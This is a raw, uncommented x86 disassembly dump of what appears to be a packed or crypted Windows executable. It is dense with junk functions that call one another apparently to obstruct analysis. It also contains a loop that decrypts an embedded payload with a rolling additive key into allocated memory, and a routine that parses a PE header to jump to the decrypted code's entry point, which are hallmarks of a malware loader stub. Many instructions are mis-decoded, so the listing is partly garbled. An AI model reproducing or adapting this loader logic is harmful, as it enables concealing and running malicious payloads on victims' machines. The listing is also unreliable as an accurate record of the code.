  4d078c:	push   DWORD PTR [edi+0xb8]
  4d0792:	pop    edx
  4d0793:	call   edx
  4d0795:	add    esp,0x58
  4d0798:	pop    ebp
  4d0799:	ret    
  4d079a:	add    BYTE PTR [eax],al
  4d079c:	pop    edi
  4d079d:	call   DWORD PTR ds:0x4d2068
  4d07a3:	call   edi
  4d07a5:	add    BYTE PTR [eax],al
  4d07a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07ad:	sub    esp,0x60
  4d07b0:	mov    ebx,0x4d30b4
  4d07b5:	adc    eax,DWORD PTR [ebp-0x24]
  4d07b8:	mov    eax,0x0
  4d07bd:	push   eax
  4d07be:	call   0x4d08cc
  4d07c3:	add    esp,0x4
  4d07c6:	push   ebx
  4d07c7:	push   esi
  4d07c8:	push   DWORD PTR [ebx+0x7c]
  4d07cb:	call   0x4d0d1c
  4d07d0:	add    esp,0x8
  4d07d3:	pop    ebx
  4d07d4:	mov    eax,0x0
  4d07d9:	push   eax
  4d07da:	call   0x4d121c
  4d07df:	add    esp,0x4
  4d07e2:	add    esp,0x60
  4d07e5:	pop    ebp
  4d07e6:	ret    
  4d07e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07ed:	sub    esp,0x30
  4d07f0:	mov    ecx,0x4d30c4
  4d07f5:	add    DWORD PTR [ebp-0x28],0x6ed8
  4d07fc:	push   ecx
  4d07fd:	push   esi
  4d07fe:	push   esi
  4d07ff:	push   DWORD PTR [ecx+0xe0]
  4d0805:	call   0x4d0a88
  4d080a:	add    esp,0xc
  4d080d:	pop    ecx
  4d080e:	push   ecx
  4d080f:	mov    ecx,0x0
  4d0814:	push   ecx
  4d0815:	call   0x4d06f8
  4d081a:	add    esp,0x4
  4d081d:	pop    ecx
  4d081e:	push   ecx
  4d081f:	push   0x0
  4d0821:	call   0x4d13bc
  4d0826:	add    esp,0x4
  4d0829:	pop    ecx
  4d082a:	add    esp,0x30
  4d082d:	pop    ebp
  4d082e:	ret    
  4d082f:	add    BYTE PTR [edi-0x1],bl
  4d0832:	adc    eax,0x4d2098
  4d0837:	call   edi
  4d0839:	add    BYTE PTR [eax],al
  4d083b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0841:	sub    esp,0x4c
  4d0844:	mov    ecx,0x4d3040
  4d0849:	add    DWORD PTR [ebp-0x2c],0xffffbd72
  4d0850:	push   ecx
  4d0851:	call   0x4d0b18
  4d0856:	add    esp,0x4
  4d0859:	pop    ecx
  4d085a:	push   ecx
  4d085b:	push   eax
  4d085c:	push   DWORD PTR [ecx+0xd8]
  4d0862:	push   ebx
  4d0863:	push   esi
  4d0864:	call   0x4d096c
  4d0869:	add    esp,0x10
  4d086c:	pop    ecx
  4d086d:	push   ecx
  4d086e:	mov    ecx,0x0
  4d0873:	push   ecx
  4d0874:	call   0x4d06f8
  4d0879:	add    esp,0x4
  4d087c:	pop    ecx
  4d087d:	add    esp,0x4c
  4d0880:	pop    ebp
  4d0881:	ret    
  4d0882:	add    BYTE PTR [eax],al
  4d0884:	mov    edi,edi
  4d0886:	push   ebp
  4d0887:	mov    ebp,esp
  4d0889:	sub    esp,0x38
  4d088c:	lea    edx,ds:0x4d3058
  4d0892:	add    ebx,DWORD PTR [edx+0x14c]
  4d0898:	push   edx
  4d0899:	push   DWORD PTR [edx+0x100]
  4d089f:	push   esi
  4d08a0:	push   DWORD PTR [edx+0x110]
  4d08a6:	call   0x4d1464
  4d08ab:	add    esp,0xc
  4d08ae:	pop    edx
  4d08af:	push   edx
  4d08b0:	push   0x0
  4d08b2:	call   0x4d1104
  4d08b7:	add    esp,0x4
  4d08ba:	pop    edx
  4d08bb:	push   edx
  4d08bc:	push   0x0
  4d08be:	call   0x4d06f8
  4d08c3:	add    esp,0x4
  4d08c6:	pop    edx
  4d08c7:	add    esp,0x38
  4d08ca:	pop    ebp
  4d08cb:	ret    
  4d08cc:	pop    edi
  4d08cd:	call   DWORD PTR ds:0x4d206c
  4d08d3:	call   edi
  4d08d5:	add    BYTE PTR [eax],al
  4d08d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08dd:	sub    esp,0x4c
  4d08e0:	lea    eax,[ecx+0x118]
  4d08e6:	adc    edi,DWORD PTR [eax-0x128]
  4d08ec:	push   eax
  4d08ed:	mov    edx,0x0
  4d08f2:	push   edx
  4d08f3:	call   0x4d14f0
  4d08f8:	add    esp,0x4
  4d08fb:	pop    eax
  4d08fc:	push   eax
  4d08fd:	push   edx
  4d08fe:	push   DWORD PTR [eax+0x1a0]
  4d0904:	push   esi
  4d0905:	push   ebx
  4d0906:	call   0x4d07e8
  4d090b:	add    esp,0x10
  4d090e:	pop    eax
  4d090f:	push   eax
  4d0910:	mov    esi,0x0
  4d0915:	push   esi
  4d0916:	call   0x4d08cc
  4d091b:	add    esp,0x4
  4d091e:	pop    eax
  4d091f:	add    esp,0x4c
  4d0922:	pop    ebp
  4d0923:	ret    
  4d0924:	mov    edi,edi
  4d0926:	push   ebp
  4d0927:	mov    ebp,esp
  4d0929:	sub    esp,0x38
  4d092c:	lea    edi,[ebx-0xbc]
  4d0932:	cmp    edi,0x2eef
  4d0938:	je     0x4d0927
  4d093a:	push   edi
  4d093b:	push   DWORD PTR [edi+0x158]
  4d0941:	push   eax
  4d0942:	call   0x4d0884
  4d0947:	add    esp,0x8
  4d094a:	pop    edi
  4d094b:	push   edi
  4d094c:	mov    esi,0x0
  4d0951:	push   esi
  4d0952:	call   0x4d13bc
  4d0957:	add    esp,0x4
  4d095a:	pop    edi
  4d095b:	push   edi
  4d095c:	push   0x0
  4d095e:	call   0x4d14f0
  4d0963:	add    esp,0x4
  4d0966:	pop    edi
  4d0967:	add    esp,0x38
  4d096a:	pop    ebp
  4d096b:	ret    
  4d096c:	mov    edi,edi
  4d096e:	push   ebp
  4d096f:	mov    ebp,esp
  4d0971:	sub    esp,0x4c
  4d0974:	lea    ebx,ds:0x4d31f0
  4d097a:	cmp    ebx,0x56a8
  4d0980:	jbe    0x4d096f
  4d0982:	call   0x4d0a7c
  4d0987:	add    esp,0x4
  4d098a:	push   ebx
  4d098b:	push   DWORD PTR [ebx+0x7c]
  4d098e:	push   DWORD PTR [ebx+0xfc]
  4d0994:	call   0x4d0924
  4d0999:	add    esp,0x8
  4d099c:	pop    ebx
  4d099d:	push   0x0
  4d099f:	call   0x4d0eb4
  4d09a4:	add    esp,0x4
  4d09a7:	add    esp,0x4c
  4d09aa:	pop    ebp
  4d09ab:	ret    
  4d09ac:	mov    edi,edi
  4d09ae:	push   ebp
  4d09af:	mov    ebp,esp
  4d09b1:	sub    esp,0x4c
  4d09b4:	lea    eax,[ebx-0x1cc]
  4d09ba:	or     DWORD PTR [ebp-0xc],edx
  4d09bd:	push   eax
  4d09be:	push   ebx
  4d09bf:	push   ecx
  4d09c0:	call   0x4d1190
  4d09c5:	add    esp,0x8
  4d09c8:	pop    eax
  4d09c9:	push   eax
  4d09ca:	mov    esi,0x0
  4d09cf:	push   esi
  4d09d0:	call   0x4d0eb4
  4d09d5:	add    esp,0x4
  4d09d8:	pop    eax
  4d09d9:	push   eax
  4d09da:	call   0x4d0a7c
  4d09df:	add    esp,0x4
  4d09e2:	pop    eax
  4d09e3:	add    esp,0x4c
  4d09e6:	pop    ebp
  4d09e7:	ret    
  4d09e8:	pop    edi
  4d09e9:	call   DWORD PTR ds:0x4d209c
  4d09ef:	call   edi
  4d09f1:	add    BYTE PTR [eax],al
  4d09f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09f9:	sub    esp,0x50
  4d09fc:	lea    ebx,ds:0x4d3094
  4d0a02:	and    DWORD PTR [ebp-0x34],edx
  4d0a05:	push   ebx
  4d0a06:	push   esi
  4d0a07:	push   esi
  4d0a08:	call   0x4d104c
  4d0a0d:	add    esp,0x8
  4d0a10:	pop    ebx
  4d0a11:	mov    edi,0x0
  4d0a16:	push   edi
  4d0a17:	call   0x4d121c
  4d0a1c:	add    esp,0x4
  4d0a1f:	lea    edi,[ebx-0x94]
  4d0a25:	push   edi
  4d0a26:	call   0x4d1098
  4d0a2b:	add    esp,0x4
  4d0a2e:	test   eax,eax
  4d0a30:	jne    0x4d0a20
  4d0a32:	add    esp,0x50
  4d0a35:	pop    ebp
  4d0a36:	ret    
  4d0a37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a3d:	sub    esp,0x34
  4d0a40:	lea    edx,[edi-0x110]
  4d0a46:	mov    ebx,ecx
  4d0a48:	push   edx
  4d0a49:	mov    ebx,0x0
  4d0a4e:	push   ebx
  4d0a4f:	call   0x4d13bc
  4d0a54:	add    esp,0x4
  4d0a57:	pop    edx
  4d0a58:	push   edx
  4d0a59:	push   eax
  4d0a5a:	push   DWORD PTR [edx+0x70]
  4d0a5d:	push   edi
  4d0a5e:	call   0x4d0f64
  4d0a63:	add    esp,0xc
  4d0a66:	pop    edx
  4d0a67:	push   edx
  4d0a68:	mov    edi,0xfffffff4
  4d0a6d:	push   edi
  4d0a6e:	call   0x4d1364
  4d0a73:	add    esp,0x4
  4d0a76:	pop    edx
  4d0a77:	add    esp,0x34
  4d0a7a:	pop    ebp
  4d0a7b:	ret    
  4d0a7c:	pop    edi
  4d0a7d:	call   DWORD PTR ds:0x4d2008
  4d0a83:	call   edi
  4d0a85:	add    BYTE PTR [eax],al
  4d0a87:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a8d:	sub    esp,0x48
  4d0a90:	lea    eax,ds:0x4d30f0
  4d0a96:	sbb    ebx,DWORD PTR [ebp-0x20]
  4d0a99:	push   eax
  4d0a9a:	mov    ebx,0x0
  4d0a9f:	push   ebx
  4d0aa0:	call   0x4d1104
  4d0aa5:	add    esp,0x4
  4d0aa8:	pop    eax
  4d0aa9:	push   eax
  4d0aaa:	push   DWORD PTR [eax+0xb4]
  4d0ab0:	push   ecx
  4d0ab1:	call   0x4d10b0
  4d0ab6:	add    esp,0x8
  4d0ab9:	pop    eax
  4d0aba:	push   eax
  4d0abb:	call   0x4d0a7c
  4d0ac0:	add    esp,0x4
  4d0ac3:	pop    eax
  4d0ac4:	add    esp,0x48
  4d0ac7:	pop    ebp
  4d0ac8:	ret    
  4d0ac9:	add    BYTE PTR [eax],al
  4d0acb:	add    BYTE PTR [edi-0x1],bl
  4d0ace:	adc    eax,0x4d2018
  4d0ad3:	call   edi
  4d0ad5:	add    BYTE PTR [eax],al
  4d0ad7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0add:	sub    esp,0x38
  4d0ae0:	lea    edx,ds:0x4d310c
  4d0ae6:	xor    eax,DWORD PTR [edx-0x2c]
  4d0ae9:	push   edx
  4d0aea:	call   0x4d0b30
  4d0aef:	add    esp,0x4
  4d0af2:	pop    edx
  4d0af3:	push   edx
  4d0af4:	push   edi
  4d0af5:	push   ecx
  4d0af6:	push   DWORD PTR [edx+0x154]
  4d0afc:	call   0x4d1550
  4d0b01:	add    esp,0xc
  4d0b04:	pop    edx
  4d0b05:	push   edx
  4d0b06:	push   0x0
  4d0b08:	call   0x4d0acc
  4d0b0d:	add    esp,0x4
  4d0b10:	pop    edx
  4d0b11:	add    esp,0x38
  4d0b14:	pop    ebp
  4d0b15:	ret    
  4d0b16:	add    BYTE PTR [eax],al
  4d0b18:	pop    edi
  4d0b19:	call   DWORD PTR ds:0x4d201c
  4d0b1f:	call   edi
  4d0b21:	add    BYTE PTR [eax],al
  4d0b23:	add    BYTE PTR [edi-0x1],bl
  4d0b26:	adc    eax,0x4d2060
  4d0b2b:	call   edi
  4d0b2d:	add    BYTE PTR [eax],al
  4d0b2f:	add    BYTE PTR [edi-0x1],bl
  4d0b32:	adc    eax,0x4d2034
  4d0b37:	call   edi
  4d0b39:	add    BYTE PTR [eax],al
  4d0b3b:	add    BYTE PTR [edi-0x1],bl
  4d0b3e:	adc    eax,0x4d20a0
  4d0b43:	call   edi
  4d0b45:	add    BYTE PTR [eax],al
  4d0b47:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b4d:	sub    esp,0x50
  4d0b50:	lea    esi,ds:0x4d30c8
  4d0b56:	or     DWORD PTR [ebp-0x4c],0x2ac9
  4d0b5d:	mov    edx,0x0
  4d0b62:	push   edx
  4d0b63:	call   0x4d121c
  4d0b68:	add    esp,0x4
  4d0b6b:	push   esi
  4d0b6c:	push   DWORD PTR [esi+0x9c]
  4d0b72:	push   eax
  4d0b73:	push   DWORD PTR [esi+0x158]
  4d0b79:	call   0x4d137c
  4d0b7e:	add    esp,0xc
  4d0b81:	pop    esi
  4d0b82:	mov    eax,0x0
  4d0b87:	push   eax
  4d0b88:	call   0x4d08cc
  4d0b8d:	add    esp,0x4
  4d0b90:	add    esp,0x50
  4d0b93:	pop    ebp
  4d0b94:	ret    
  4d0b95:	add    BYTE PTR [eax],al
  4d0b97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b9d:	sub    esp,0x50
  4d0ba0:	lea    edi,ds:0x4d3160
  4d0ba6:	add    edx,DWORD PTR [ebp-0x3c]
  4d0ba9:	push   edi
  4d0baa:	call   0x4d0b30
  4d0baf:	add    esp,0x4
  4d0bb2:	pop    edi
  4d0bb3:	push   edi
  4d0bb4:	push   DWORD PTR [edi+0x118]
  4d0bba:	push   DWORD PTR [edi+0x100]
  4d0bc0:	push   DWORD PTR [edi+0xd4]
  4d0bc6:	push   DWORD PTR [edi+0xe4]
  4d0bcc:	call   0x4d0dcc
  4d0bd1:	add    esp,0x10
  4d0bd4:	pop    edi
  4d0bd5:	push   edi
  4d0bd6:	lea    edx,[edi-0x160]
  4d0bdc:	push   edx
  4d0bdd:	call   0x4d1098
  4d0be2:	add    esp,0x4
  4d0be5:	test   eax,eax
  4d0be7:	jne    0x4d0bd6
  4d0be9:	pop    edi
  4d0bea:	add    esp,0x50
  4d0bed:	pop    ebp
  4d0bee:	ret    
  4d0bef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bf5:	sub    esp,0x44
  4d0bf8:	lea    eax,ds:0x4d3064
  4d0bfe:	sub    esi,0xffffd377
  4d0c04:	push   eax
  4d0c05:	lea    edx,[eax-0x64]
  4d0c08:	push   edx
  4d0c09:	call   0x4d1098
  4d0c0e:	add    esp,0x4
  4d0c11:	test   eax,eax
  4d0c13:	jne    0x4d0c05
  4d0c15:	pop    eax
  4d0c16:	push   eax
  4d0c17:	push   DWORD PTR [eax+0x2c]
  4d0c1a:	push   edx
  4d0c1b:	push   DWORD PTR [eax+0x84]
  4d0c21:	call   0x4d0ec0
  4d0c26:	add    esp,0xc
  4d0c29:	pop    eax
  4d0c2a:	push   eax
  4d0c2b:	push   0x0
  4d0c2d:	call   0x4d13bc
  4d0c32:	add    esp,0x4
  4d0c35:	pop    eax
  4d0c36:	add    esp,0x44
  4d0c39:	pop    ebp
  4d0c3a:	ret    
  4d0c3b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c41:	sub    esp,0x28
  4d0c44:	lea    edx,ds:0x4d311c
  4d0c4a:	xor    DWORD PTR [ebp-0x24],0xffffffad
  4d0c4e:	push   edx
  4d0c4f:	push   DWORD PTR [edx+0x154]
  4d0c55:	push   esi
  4d0c56:	push   esi
  4d0c57:	call   0x4d0b48
  4d0c5c:	add    esp,0xc
  4d0c5f:	pop    edx
  4d0c60:	push   edx
  4d0c61:	push   0x0
  4d0c63:	call   0x4d10f8
  4d0c68:	add    esp,0x4
  4d0c6b:	pop    edx
  4d0c6c:	push   edx
  4d0c6d:	push   0x0
  4d0c6f:	call   0x4d0eb4
  4d0c74:	add    esp,0x4
  4d0c77:	pop    edx
  4d0c78:	add    esp,0x28
  4d0c7b:	pop    ebp
  4d0c7c:	ret    
  4d0c7d:	add    BYTE PTR [eax],al
  4d0c7f:	add    BYTE PTR [edi+0x2b],dl
  4d0c82:	call   DWORD PTR [edi+0x57]
  4d0c85:	push   edi
  4d0c86:	push   edi
  4d0c87:	call   0x4d0a7c
  4d0c8c:	sub    esp,0xfffffffc
  4d0c8f:	call   0x4d1370
  4d0c94:	push   0x2
  4d0c96:	xor    eax,eax
  4d0c98:	dec    eax
  4d0c99:	and    eax,0x4d3030
  4d0c9e:	push   0x0
  4d0ca0:	lea    ecx,[eax+0x6]
  4d0ca3:	add    BYTE PTR [ecx],0x41
  4d0ca6:	push   eax
  4d0ca7:	call   0x4d111c
  4d0cac:	pop    edi
  4d0cad:	pop    edi
  4d0cae:	pop    edi
  4d0caf:	lea    edi,[eax+0x3b]
  4d0cb2:	mov    edi,DWORD PTR [edi]
  4d0cb4:	lea    eax,[eax+edi*1]
  4d0cb7:	mov    eax,DWORD PTR [eax+0x28]
  4d0cba:	pusha  
  4d0cbb:	mov    ah,0x45
  4d0cbd:	sub    al,ah
  4d0cbf:	ja     0x4d0750
  4d0cc5:	popa   
  4d0cc6:	ret    
  4d0cc7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ccd:	sub    esp,0x2c
  4d0cd0:	lea    eax,ds:0x4d314c
  4d0cd6:	add    ebx,edi
  4d0cd8:	push   eax
  4d0cd9:	push   0x0
  4d0cdb:	call   0x4d08cc
  4d0ce0:	add    esp,0x4
  4d0ce3:	pop    eax
  4d0ce4:	push   eax
  4d0ce5:	push   DWORD PTR [eax+0x1fc]
  4d0ceb:	push   esi
  4d0cec:	push   DWORD PTR [eax+0x1d4]
  4d0cf2:	push   DWORD PTR [eax+0x154]
  4d0cf8:	call   0x4d141c
  4d0cfd:	add    esp,0x10
  4d0d00:	pop    eax
  4d0d01:	push   eax
  4d0d02:	call   0x4d0b30
  4d0d07:	add    esp,0x4
  4d0d0a:	pop    eax
  4d0d0b:	add    esp,0x2c
  4d0d0e:	pop    ebp
  4d0d0f:	ret    
  4d0d10:	pop    edi
  4d0d11:	call   DWORD PTR ds:0x4d207c
  4d0d17:	call   edi
  4d0d19:	add    BYTE PTR [eax],al
  4d0d1b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d21:	sub    esp,0x5c
  4d0d24:	lea    ecx,[ebx-0xb0]
  4d0d2a:	sbb    DWORD PTR [ebp-0x18],0x3a20
  4d0d31:	push   ecx
  4d0d32:	push   ebx
  4d0d33:	push   DWORD PTR [ecx+0x68]
  4d0d36:	push   edi
  4d0d37:	call   0x4d11c8
  4d0d3c:	add    esp,0xc
  4d0d3f:	pop    ecx
  4d0d40:	push   ecx
  4d0d41:	lea    eax,[ecx-0x4]
  4d0d44:	push   eax
  4d0d45:	call   0x4d1098
  4d0d4a:	add    esp,0x4
  4d0d4d:	test   eax,eax
  4d0d4f:	jne    0x4d0d41
  4d0d51:	pop    ecx
  4d0d52:	push   ecx
  4d0d53:	push   0x0
  4d0d55:	call   0x4d08cc
  4d0d5a:	add    esp,0x4
  4d0d5d:	pop    ecx
  4d0d5e:	add    esp,0x5c
  4d0d61:	pop    ebp
  4d0d62:	ret    
  4d0d63:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d69:	sub    esp,0x1c
  4d0d6c:	lea    ecx,ds:0x4d3030
  4d0d72:	adc    DWORD PTR [ebp-0x8],0xffffffaa
  4d0d76:	push   ecx
  4d0d77:	push   DWORD PTR [ecx+0x18c]
  4d0d7d:	push   DWORD PTR [ecx+0x1dc]
  4d0d83:	push   DWORD PTR [ecx+0x20]
  4d0d86:	call   0x4d08d8
  4d0d8b:	add    esp,0xc
  4d0d8e:	pop    ecx
  4d0d8f:	push   ecx
  4d0d90:	mov    ebx,0x0
  4d0d95:	push   ebx
  4d0d96:	call   0x4d121c
  4d0d9b:	add    esp,0x4
  4d0d9e:	pop    ecx
  4d0d9f:	push   ecx
  4d0da0:	mov    eax,0x0
  4d0da5:	push   eax
  4d0da6:	call   0x4d10f8
  4d0dab:	add    esp,0x4
  4d0dae:	pop    ecx
  4d0daf:	add    esp,0x1c
  4d0db2:	pop    ebp
  4d0db3:	ret    
  4d0db4:	pop    edi
  4d0db5:	call   DWORD PTR ds:0x4d202c
  4d0dbb:	call   edi
  4d0dbd:	add    BYTE PTR [eax],al
  4d0dbf:	add    BYTE PTR [edi-0x1],bl
  4d0dc2:	adc    eax,0x4d2090
  4d0dc7:	call   edi
  4d0dc9:	add    BYTE PTR [eax],al
  4d0dcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dd1:	sub    esp,0x50
  4d0dd4:	lea    ecx,ds:0x4d30c4
  4d0dda:	sbb    DWORD PTR [ebp-0x3c],ebx
  4d0ddd:	push   ecx
  4d0dde:	push   edi
  4d0ddf:	push   edi
  4d0de0:	push   edi
  4d0de1:	call   0x4d1134
  4d0de6:	add    esp,0xc
  4d0de9:	pop    ecx
  4d0dea:	push   ecx
  4d0deb:	mov    ebx,0x0
  4d0df0:	push   ebx
  4d0df1:	call   0x4d14f0
  4d0df6:	add    esp,0x4
  4d0df9:	pop    ecx
  4d0dfa:	push   ecx
  4d0dfb:	call   0x4d0b18
  4d0e00:	add    esp,0x4
  4d0e03:	pop    ecx
  4d0e04:	add    esp,0x50
  4d0e07:	pop    ebp
  4d0e08:	ret    
  4d0e09:	add    BYTE PTR [eax],al
  4d0e0b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e11:	sub    esp,0x58
  4d0e14:	lea    ecx,[edi+0x78]
  4d0e17:	mov    DWORD PTR [ecx+0x50],0xffffffbd
  4d0e1e:	push   ecx
  4d0e1f:	mov    edi,0x0
  4d0e24:	push   edi
  4d0e25:	call   0x4d08cc
  4d0e2a:	add    esp,0x4
  4d0e2d:	pop    ecx
  4d0e2e:	push   ecx
  4d0e2f:	push   DWORD PTR [ecx+0x80]
  4d0e35:	push   DWORD PTR [ecx+0x104]
  4d0e3b:	push   DWORD PTR [ecx+0x18]
  4d0e3e:	call   0x4d09f4
  4d0e43:	add    esp,0xc
  4d0e46:	pop    ecx
  4d0e47:	push   ecx
  4d0e48:	lea    eax,[ecx-0x98]
  4d0e4e:	push   eax
  4d0e4f:	call   0x4d1098
  4d0e54:	add    esp,0x4
  4d0e57:	test   eax,eax
  4d0e59:	jne    0x4d0e48
  4d0e5b:	pop    ecx
  4d0e5c:	add    esp,0x58
  4d0e5f:	pop    ebp
  4d0e60:	ret    
  4d0e61:	add    BYTE PTR [eax],al
  4d0e63:	add    BYTE PTR [edi-0x1],bl
  4d0e66:	adc    eax,0x4d2070
  4d0e6b:	call   edi
  4d0e6d:	add    BYTE PTR [eax],al
  4d0e6f:	add    BYTE PTR [edi-0x1],bl
  4d0e72:	adc    eax,0x4d2014
  4d0e77:	call   edi
  4d0e79:	add    BYTE PTR [eax],al
  4d0e7b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e81:	sub    esp,0x50
  4d0e84:	mov    edx,0x4d3018
  4d0e89:	and    esi,DWORD PTR [edx+0x3c]
  4d0e8c:	push   edx
  4d0e8d:	call   0x4d0b18
  4d0e92:	add    esp,0x4
  4d0e95:	pop    edx
  4d0e96:	push   edx
  4d0e97:	push   edi
  4d0e98:	push   eax
  4d0e99:	push   esi
  4d0e9a:	call   0x4d0f1c
  4d0e9f:	add    esp,0xc
  4d0ea2:	pop    edx
  4d0ea3:	push   edx
  4d0ea4:	push   0x0
  4d0ea6:	call   0x4d12b8
  4d0eab:	add    esp,0x4
  4d0eae:	pop    edx
  4d0eaf:	add    esp,0x50
  4d0eb2:	pop    ebp
  4d0eb3:	ret    
  4d0eb4:	pop    edi
  4d0eb5:	call   DWORD PTR ds:0x4d2030
  4d0ebb:	call   edi
  4d0ebd:	add    BYTE PTR [eax],al
  4d0ebf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ec5:	sub    esp,0x5c
  4d0ec8:	lea    esi,[eax+0xfc]
  4d0ece:	cmp    esi,0x6908
  4d0ed4:	jbe    0x4d0ec3
  4d0ed6:	push   esi
  4d0ed7:	push   ecx
  4d0ed8:	push   DWORD PTR [esi+0x1e8]
  4d0ede:	push   DWORD PTR [esi+0x1a8]
  4d0ee4:	push   DWORD PTR [esi+0x1d8]
  4d0eea:	call   0x4d0ff4
  4d0eef:	add    esp,0x10
  4d0ef2:	pop    esi
  4d0ef3:	mov    ebx,0x0
  4d0ef8:	push   ebx
  4d0ef9:	call   0x4d10f8
  4d0efe:	add    esp,0x4
  4d0f01:	push   0x0
  4d0f03:	call   0x4d10f8
  4d0f08:	add    esp,0x4
  4d0f0b:	add    esp,0x5c
  4d0f0e:	pop    ebp
  4d0f0f:	ret    
  4d0f10:	pop    edi
  4d0f11:	call   DWORD PTR ds:0x4d2054
  4d0f17:	call   edi
  4d0f19:	add    BYTE PTR [eax],al
  4d0f1b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f21:	sub    esp,0x4c
  4d0f24:	lea    edi,[edx+0x8]
  4d0f27:	and    DWORD PTR [edi+0x178],ecx
  4d0f2d:	push   edi
  4d0f2e:	mov    esi,0x0
  4d0f33:	push   esi
  4d0f34:	call   0x4d121c
  4d0f39:	add    esp,0x4
  4d0f3c:	pop    edi
  4d0f3d:	push   edi
  4d0f3e:	push   DWORD PTR [edi+0x88]
  4d0f44:	push   eax
  4d0f45:	call   0x4d0e0c
  4d0f4a:	add    esp,0x8
  4d0f4d:	pop    edi
  4d0f4e:	push   edi
  4d0f4f:	mov    esi,0x0
  4d0f54:	push   esi
  4d0f55:	call   0x4d121c
  4d0f5a:	add    esp,0x4
  4d0f5d:	pop    edi
  4d0f5e:	add    esp,0x4c
  4d0f61:	pop    ebp
  4d0f62:	ret    
  4d0f63:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f69:	sub    esp,0x54
  4d0f6c:	sub    DWORD PTR [edx+0x74],0xffffca5b
  4d0f73:	lea    esi,[edx+0x108]
  4d0f79:	mov    edx,0x6ac
  4d0f7e:	push   edx
  4d0f7f:	push   0x6ac
  4d0f84:	push   0x40001
  4d0f89:	mov    eax,0x8629858e
  4d0f8e:	push   DWORD PTR [eax+0x7a239a86]
  4d0f94:	sub    DWORD PTR [esp],0x2
  4d0f98:	mov    eax,0x4d203c
  4d0f9d:	pop    DWORD PTR [eax]
  4d0f9f:	call   0x4d111c
  4d0fa4:	add    esp,0x4
  4d0fa7:	push   eax
  4d0fa8:	pop    DWORD PTR [esi-0x70]
  4d0fab:	mov    ecx,DWORD PTR [esi-0x70]
  4d0fae:	mov    eax,ecx
  4d0fb0:	sub    ecx,ecx
  4d0fb2:	dec    ecx
  4d0fb3:	and    ecx,0x4d0014
  4d0fb9:	mov    ebx,0xd5d9a824
  4d0fbe:	push   0x6ac
  4d0fc3:	pop    edx
  4d0fc4:	xor    edi,edi
  4d0fc6:	push   DWORD PTR [ecx+edi*1]
  4d0fc9:	add    DWORD PTR [esp],ebx
  4d0fcc:	pop    DWORD PTR [eax+edi*2]
  4d0fcf:	dec    DWORD PTR [eax]
  4d0fd1:	xor    ebx,ebx
  4d0fd3:	add    ebx,DWORD PTR [ecx]
  4d0fd5:	add    ecx,0x4
  4d0fd8:	add    eax,0x4
  4d0fdb:	sub    edx,0x4
  4d0fde:	cmp    edx,0x0
  4d0fe1:	jne    0x4d0fc4
  4d0fe3:	push   0x0
  4d0fe5:	call   0x4d13bc
  4d0fea:	add    esp,0x4
  4d0fed:	add    esp,0x54
  4d0ff0:	pop    ebp
  4d0ff1:	ret    
  4d0ff2:	add    BYTE PTR [eax],al
  4d0ff4:	mov    edi,edi
  4d0ff6:	push   ebp
  4d0ff7:	mov    ebp,esp
  4d0ff9:	sub    esp,0x30
  4d0ffc:	lea    edi,ds:0x4d3164
  4d1002:	or     eax,0x3447
  4d1007:	push   edi
  4d1008:	push   ecx
  4d1009:	push   DWORD PTR [edi+0x14]
  4d100c:	push   DWORD PTR [edi+0x1fc]
  4d1012:	push   ecx
  4d1013:	call   0x4d12d0
  4d1018:	add    esp,0x10
  4d101b:	pop    edi
  4d101c:	push   edi
  4d101d:	push   0xfffffff4
  4d101f:	call   0x4d1364
  4d1024:	add    esp,0x4
  4d1027:	pop    edi
  4d1028:	push   edi
  4d1029:	mov    ebx,0x0
  4d102e:	push   ebx
  4d102f:	call   0x4d13bc
  4d1034:	add    esp,0x4
  4d1037:	pop    edi
  4d1038:	add    esp,0x30
  4d103b:	pop    ebp
  4d103c:	ret    
  4d103d:	add    BYTE PTR [eax],al
  4d103f:	add    BYTE PTR [edi-0x1],bl
  4d1042:	adc    eax,0x4d2088
  4d1047:	call   edi
  4d1049:	add    BYTE PTR [eax],al
  4d104b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1051:	sub    esp,0x60
  4d1054:	mov    edx,0x4d3030
  4d1059:	sub    esi,DWORD PTR [edx+0xe4]
  4d105f:	push   edx
  4d1060:	push   ecx
  4d1061:	push   DWORD PTR [edx+0xf8]
  4d1067:	push   DWORD PTR [edx+0x16c]
  4d106d:	call   0x4d0bf0
  4d1072:	add    esp,0xc
  4d1075:	pop    edx
  4d1076:	push   edx
  4d1077:	mov    edx,0x0
  4d107c:	push   edx
  4d107d:	call   0x4d13bc
  4d1082:	add    esp,0x4
  4d1085:	pop    edx
  4d1086:	push   edx
  4d1087:	call   0x4d0b30
  4d108c:	add    esp,0x4
  4d108f:	pop    edx
  4d1090:	add    esp,0x60
  4d1093:	pop    ebp
  4d1094:	ret    
  4d1095:	add    BYTE PTR [eax],al
  4d1097:	add    BYTE PTR [edi-0x1],bl
  4d109a:	adc    eax,0x4d2044
  4d109f:	call   edi
  4d10a1:	add    BYTE PTR [eax],al
  4d10a3:	add    BYTE PTR [edi-0x1],bl
  4d10a6:	adc    eax,0x4d205c
  4d10ab:	call   edi
  4d10ad:	add    BYTE PTR [eax],al
  4d10af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10b5:	sub    esp,0x28
  4d10b8:	lea    edi,[eax+0xf0]
